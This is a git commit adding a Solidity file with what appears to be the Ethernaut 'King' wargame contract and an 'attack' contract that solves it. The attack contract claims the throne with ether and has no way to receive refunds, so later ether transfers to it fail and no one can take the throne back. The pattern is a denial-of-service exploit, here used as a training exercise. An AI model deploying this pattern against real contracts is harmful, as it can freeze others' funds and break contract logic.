651f3f0504d1e33d3367a43d9bb91917ceeea4c9
oh7887 <118185225+oh7887@users.noreply.github.com>
2023-02-25 18:12:07 +0800

    Create 10.sol

---
+++ 10.sol
@@ -0,0 +1,36 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.0;
+
+contract King {
+
+  address king;
+  uint public prize;
+  address public owner;
+
+  constructor() payable {
+    owner = msg.sender;  
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  receive() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    payable(king).transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function _king() public view returns (address) {
+    return king;
+  }
+}
+contract attack{
+    
+    function complete(address payable _addr)public payable{ 
+        _addr.call{value:msg.value}("");
+    }
+    function reTran(address payable add)public{
+        add.transfer(address(this).balance);
+    }
+
+}
